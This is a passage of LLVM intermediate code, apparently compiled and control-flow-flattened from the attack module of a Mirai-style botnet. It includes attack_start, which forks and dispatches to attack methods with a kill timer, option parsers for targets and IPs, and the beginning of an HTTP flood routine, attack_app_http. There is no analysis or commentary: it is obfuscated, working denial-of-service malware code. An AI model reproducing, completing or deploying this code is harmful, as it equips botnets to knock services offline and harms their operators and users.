; <label>:235:                                    ; preds = %loopEntry
  %236 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %237 = bitcast %struct.attack_target* %236 to i8*
  call void @free(i8* %237) #6
  store i32 -1838459027, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %240 = icmp ne %struct.attack_option* %239, null
  %241 = select i1 %240, i32 -278804474, i32 874158574
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %244 = load i8, i8* %9, align 1
  %245 = zext i8 %244 to i32
  call void @free_opts(%struct.attack_option* %243, i32 %245)
  store i32 874158574, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %242, %238, %235, %231, %223, %222, %219, %190, %189, %176, %175, %158, %157, %152, %146, %141, %129, %128, %123, %120, %78, %72, %67, %66, %58, %57, %45, %44, %33, %32, %18, %17, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -2031285980, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2031285980, label %first
    i32 -1325361939, label %20
    i32 -1674651312, label %24
    i32 -2139432201, label %25
    i32 687425576, label %30
    i32 260814431, label %31
    i32 -1919070058, label %35
    i32 1009078464, label %40
    i32 698287367, label %41
    i32 1493869458, label %47
    i32 754304473, label %60
    i32 -1960870832, label %72
    i32 131202623, label %73
    i32 -771498318, label %76
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp eq i32 %.reload, -1
  %19 = select i1 %18, i32 -1674651312, i32 -1325361939
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %13, align 4
  %22 = icmp sgt i32 %21, 0
  %23 = select i1 %22, i32 -1674651312, i32 -2139432201
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  ret void

; <label>:25:                                     ; preds = %loopEntry
  %26 = call i32 @fork() #6
  store i32 %26, i32* %14, align 4
  %27 = load i32, i32* %14, align 4
  %28 = icmp eq i32 %27, -1
  %29 = select i1 %28, i32 687425576, i32 260814431
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  call void @exit(i32 0) #8
  unreachable

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i32, i32* %14, align 4
  %33 = icmp eq i32 %32, 0
  %34 = select i1 %33, i32 -1919070058, i32 1009078464
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %7, align 4
  %37 = call i32 @sleep(i32 %36)
  %38 = call i32 @getppid() #6
  %39 = call i32 @kill(i32 %38, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:40:                                     ; preds = %loopEntry
  store i32 0, i32* %15, align 4
  store i32 698287367, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %15, align 4
  %43 = load i8, i8* @methods_len, align 1
  %44 = zext i8 %43 to i32
  %45 = icmp slt i32 %42, %44
  %46 = select i1 %45, i32 1493869458, i32 -771498318
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %49 = load i32, i32* %15, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %48, i64 %50
  %52 = load %struct.attack_method*, %struct.attack_method** %51, align 8
  %53 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %52, i32 0, i32 1
  %54 = load i8, i8* %53, align 8
  %55 = zext i8 %54 to i32
  %56 = load i8, i8* %8, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %55, %57
  %59 = select i1 %58, i32 754304473, i32 -1960870832
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %62 = load i32, i32* %15, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %61, i64 %63
  %65 = load %struct.attack_method*, %struct.attack_method** %64, align 8
  %66 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %65, i32 0, i32 0
  %67 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %66, align 8
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %70 = load i8, i8* %11, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %67(i8 zeroext %68, %struct.attack_target* %69, i8 zeroext %70, %struct.attack_option* %71)
  store i32 -771498318, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i32 131202623, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %15, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %15, align 4
  store i32 698287367, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  call void @exit(i32 0) #8
  unreachable

loopEnd:                                          ; preds = %73, %72, %60, %47, %41, %40, %31, %25, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %.reg2mem = alloca %struct.attack_option*
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  store %struct.attack_option* %6, %struct.attack_option** %.reg2mem
  %switchVar = alloca i32
  store i32 -1348673007, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1348673007, label %first
    i32 1335292198, label %9
    i32 1281101996, label %10
    i32 704436317, label %11
    i32 -1599763609, label %16
    i32 1334631447, label %25
    i32 1434947568, label %32
    i32 -1233344986, label %33
    i32 388866177, label %36
    i32 216060747, label %39
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.attack_option*, %struct.attack_option** %.reg2mem
  %7 = icmp eq %struct.attack_option* %.reload, null
  %8 = select i1 %7, i32 1335292198, i32 1281101996
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  store i32 216060747, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 704436317, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %5, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp slt i32 %12, %13
  %15 = select i1 %14, i32 -1599763609, i32 388866177
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 0
  %22 = load i8*, i8** %21, align 8
  %23 = icmp ne i8* %22, null
  %24 = select i1 %23, i32 1334631447, i32 1434947568
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i64 %28
  %30 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %29, i32 0, i32 0
  %31 = load i8*, i8** %30, align 8
  call void @free(i8* %31) #6
  store i32 1434947568, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -1233344986, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %5, align 4
  store i32 704436317, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %38 = bitcast %struct.attack_option* %37 to i8*
  call void @free(i8* %38) #6
  store i32 216060747, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %36, %33, %32, %25, %16, %11, %10, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1450841482, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1450841482, label %11
    i32 -1837843123, label %17
    i32 1159982458, label %29
    i32 870755488, label %36
    i32 2084481084, label %37
    i32 -222235130, label %40
    i32 -922196850, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  %16 = select i1 %15, i32 -1837843123, i32 -222235130
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %19 = load i32, i32* %10, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i64 %20
  %22 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %21, i32 0, i32 1
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = load i8, i8* %8, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %24, %26
  %28 = select i1 %27, i32 1159982458, i32 870755488
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %31 = load i32, i32* %10, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %30, i64 %32
  %34 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %33, i32 0, i32 0
  %35 = load i8*, i8** %34, align 8
  store i8* %35, i8** %5, align 8
  store i32 -922196850, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  store i32 2084481084, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %10, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %10, align 4
  store i32 1450841482, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %9, align 8
  store i8* %41, i8** %5, align 8
  store i32 -922196850, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  ret i8* %43

loopEnd:                                          ; preds = %40, %37, %36, %29, %17, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  store i8* %15, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 -701715855, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -701715855, label %first
    i32 -2145667154, label %18
    i32 1729493231, label %20
    i32 2114593572, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %16 = icmp eq i8* %.reload, null
  %17 = select i1 %16, i32 -2145667154, i32 1729493231
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %9, align 4
  store i32 %19, i32* %5, align 4
  store i32 2114593572, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i8*, i8** %10, align 8
  %22 = call i32 @util_atoi(i8* %21, i32 10)
  store i32 %22, i32* %5, align 4
  store i32 2114593572, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %5, align 4
  ret i32 %24

loopEnd:                                          ; preds = %20, %18, %first, %switchDefault
  br label %loopEntry
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  store i8* %15, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 -1618682835, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1618682835, label %first
    i32 -1712168744, label %18
    i32 1934710617, label %20
    i32 -1028524870, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %16 = icmp eq i8* %.reload, null
  %17 = select i1 %16, i32 -1712168744, i32 1934710617
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %9, align 4
  store i32 %19, i32* %5, align 4
  store i32 -1028524870, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i8*, i8** %10, align 8
  %22 = call i32 @inet_addr(i8* %21) #6
  store i32 %22, i32* %5, align 4
  store i32 -1028524870, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %5, align 4
  ret i32 %24

loopEnd:                                          ; preds = %20, %18, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem10 = alloca i32
  %.reg2mem = alloca i8*
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 21, i8* null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 8, i8* null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 24, i32 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 10241, i32 16, i1 false)
  %84 = load i8*, i8** %16, align 8
  store i8* %84, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 -1769075121, i32* %switchVar
  %.reg2mem17 = alloca i1
  %.reg2mem19 = alloca i1
  %.reg2mem21 = alloca i1
  %.reg2mem23 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar9 = load i32, i32* %switchVar
  switch i32 %switchVar9, label %switchDefault [
    i32 -1769075121, label %first
    i32 -478137180, label %87
    i32 980934652, label %91
    i32 145735943, label %92
    i32 412267868, label %97
    i32 500956462, label %98
    i32 -59348031, label %103
    i32 -1631250798, label %104
    i32 179748305, label %109
    i32 -1516606543, label %110
    i32 -386428022, label %111
    i32 -1474356353, label %117
    i32 506307985, label %126
    i32 -1930097074, label %135
    i32 557104655, label %144
    i32 159581536, label %145
    i32 -286873282, label %148
    i32 690238073, label %152
    i32 661783787, label %153
    i32 -692796122, label %158
    i32 174999366, label %163
    i32 -803479457, label %206
    i32 1553598366, label %234
    i32 1125950080, label %271
    i32 38019215, label %301
    i32 -1313146943, label %NodeBlock7
    i32 866208778, label %NodeBlock5
    i32 1259942162, label %NodeBlock3
    i32 -27125335, label %LeafBlock1
    i32 1851843660, label %NodeBlock
    i32 -1956632471, label %LeafBlock
    i32 -695033282, label %310
    i32 -1605939562, label %319
    i32 1347609670, label %328
    i32 -233416032, label %337
    i32 116841844, label %346
    i32 -292837491, label %NewDefault
    i32 -1240872668, label %355
    i32 1408442000, label %364
    i32 1426608168, label %367
    i32 -728621910, label %368
    i32 -1175196367, label %371
    i32 -41068445, label %380
    i32 -720427335, label %381
    i32 -2056683923, label %390
    i32 -120314153, label %391
    i32 -388224184, label %396
    i32 -2033892053, label %407
    i32 1552742507, label %413
    i32 -1208276379, label %416
    i32 608866941, label %419
    i32 814253623, label %420
    i32 -460699051, label %427
    i32 -253731804, label %434
    i32 1573764332, label %439
    i32 -1688547935, label %445
    i32 574287833, label %446
    i32 -1323643040, label %504
    i32 -412137295, label %509
    i32 53573558, label %510
    i32 -430703330, label %517
    i32 1332994091, label %525
    i32 -1881495417, label %534
    i32 1806642823, label %556
    i32 770856625, label %561
    i32 1494148204, label %562
    i32 1441256007, label %569
    i32 123843946, label %682
    i32 85504333, label %723
    i32 154583352, label %729
    i32 -1215697258, label %736
    i32 -378940321, label %743
    i32 1787080433, label %762
    i32 1945649657, label %765
    i32 -763491875, label %772
    i32 -769525275, label %782
    i32 528732969, label %790
    i32 -1824860601, label %800
    i32 -1722353547, label %808
    i32 -694240897, label %843
    i32 -1329262357, label %848
    i32 -81539275, label %849
    i32 2047679813, label %856
    i32 1550671564, label %878
    i32 536142275, label %883
    i32 1935283915, label %884
    i32 -106941578, label %891
    i32 -866391389, label %913
    i32 -1498129756, label %918
    i32 -2117092127, label %919
    i32 1464513630, label %926
    i32 -1382804257, label %948
    i32 1521497501, label %953
    i32 -274386569, label %954
    i32 595553524, label %961
    i32 -1265196952, label %970
    i32 -865724330, label %979
    i32 -1253819051, label %980
    i32 1747107870, label %981
    i32 -1694037774, label %982
    i32 -1862035464, label %983
    i32 646044068, label %984
    i32 -1577572110, label %985
    i32 792116999, label %986
    i32 -15721029, label %989
    i32 2084519512, label %993
    i32 555490172, label %994
    i32 -1988608362, label %1004
    i32 502775756, label %1005
    i32 -1529631243, label %1006
    i32 -2019813585, label %1011
    i32 -354237080, label %1021
    i32 -1758360404, label %1022
    i32 422554310, label %1040
    i32 1530753313, label %1049
    i32 -2014517752, label %1053
    i32 -1908550454, label %1056
    i32 770170404, label %1065
    i32 -1135419723, label %1066
    i32 -1223056093, label %1084
    i32 2072735996, label %1091
    i32 -303963528, label %1101
    i32 230101174, label %1110
    i32 -421709571, label %1116
    i32 2078313923, label %1120
    i32 986016826, label %1121
    i32 -1205350572, label %1133
    i32 -1799508473, label %1136
    i32 -83504973, label %1143
    i32 1002072451, label %1146
    i32 1684588380, label %1155
    i32 1796917298, label %1167
    i32 -582392535, label %1170
    i32 433827636, label %1182
    i32 -1052385994, label %1189
    i32 -396390421, label %1192
    i32 -1628062767, label %1205
    i32 1503474292, label %1208
    i32 96692902, label %1209
    i32 -1195566466, label %1210
    i32 -1898084102, label %1219
    i32 -1961719596, label %1231
    i32 -1275813871, label %1234
    i32 -1561555539, label %1246
    i32 -77268513, label %1253
    i32 -1574955637, label %1256
    i32 402156900, label %1269
    i32 -574710374, label %1272
    i32 -2058864946, label %1273
    i32 -1054755709, label %1274
    i32 1044357268, label %1281
    i32 262208459, label %1293
    i32 -1176310657, label %1296
    i32 1386865037, label %1308
    i32 122033771, label %1315
    i32 -262471739, label %1318
    i32 1647574983, label %1328
    i32 -1700423069, label %1329
    i32 130619671, label %1332
    i32 -1153492454, label %1333
    i32 -321988366, label %1343
    i32 1468158007, label %1348
    i32 717898689, label %1350
    i32 1073453704, label %1367
    i32 1483899070, label %1370
    i32 -2065302120, label %1387
    i32 -413997629, label %1396
    i32 -1226998832, label %1399
    i32 -726489164, label %1415
    i32 -836501736, label %1430
    i32 788256987, label %1438
    i32 -868196718, label %1444
    i32 -684946953, label %1453
    i32 2031301186, label %1454
    i32 -1740159800, label %1455
    i32 259003866, label %1458
    i32 70905783, label %1467
    i32 -880360806, label %1469
    i32 -1948507065, label %1476
    i32 -1710585265, label %1488
    i32 -1790854133, label %1489
    i32 -147368845, label %1490
    i32 -275496037, label %1493
    i32 2031167659, label %1497
    i32 -1780080684, label %1502
    i32 -64710298, label %1517
    i32 1618790590, label %1518
    i32 -1701471951, label %1519
    i32 -302415407, label %1520
    i32 -306641800, label %1524
    i32 -703667495, label %1531
    i32 -7273891, label %1543
    i32 -18521434, label %1546
    i32 -262271036, label %1558
    i32 -784472844, label %1565
    i32 422074037, label %1568
    i32 1085639693, label %1581
    i32 -1924078108, label %1588
    i32 1443336705, label %1591
    i32 -1012070221, label %1601
    i32 286849744, label %1610
    i32 1633311763, label %1619
    i32 -50089703, label %1624
    i32 1072117933, label %1627
    i32 1200287820, label %1632
    i32 -84165477, label %1637
    i32 784962264, label %1643
    i32 95467568, label %1652
    i32 243054952, label %1665
    i32 112366187, label %1676
    i32 1689638800, label %1677
    i32 -269768736, label %1678
    i32 1950792420, label %1685
    i32 -476292430, label %1698
    i32 1395506330, label %1707
    i32 2036427498, label %1718
    i32 -435818682, label %1719
    i32 1374054566, label %1720
    i32 -1643240108, label %1723
    i32 -248361911, label %1724
    i32 -57633494, label %1731
    i32 339027427, label %1743
    i32 -1985127720, label %1746
    i32 300174417, label %1758
    i32 -1612589025, label %1765
    i32 2092427477, label %1768
    i32 615782483, label %1776
    i32 2024690172, label %1785
    i32 2031909386, label %1794
    i32 794007438, label %1802
    i32 -1297771190, label %1804
    i32 -1995493266, label %1807
    i32 1137014252, label %1816
    i32 -641134741, label %1831
    i32 1430029824, label %1834
    i32 -145368711, label %1847
    i32 1393537091, label %1860
    i32 -979701941, label %1869
    i32 740392331, label %1888
    i32 -1682125817, label %1901
    i32 -187235951, label %1902
    i32 -751407083, label %1905
    i32 -1775480146, label %1909
    i32 -584406361, label %1913
    i32 -657360589, label %1920
    i32 2115821246, label %1922
    i32 242626544, label %1924
    i32 1124022979, label %1935
    i32 -672638093, label %1942
    i32 -441873711, label %1945
    i32 532386433, label %1955
    i32 -911127405, label %1964
    i32 -1413602084, label %1973
    i32 -1176555668, label %1978
    i32 444274115, label %1981
    i32 -932258599, label %1986
    i32 -1287144592, label %1991
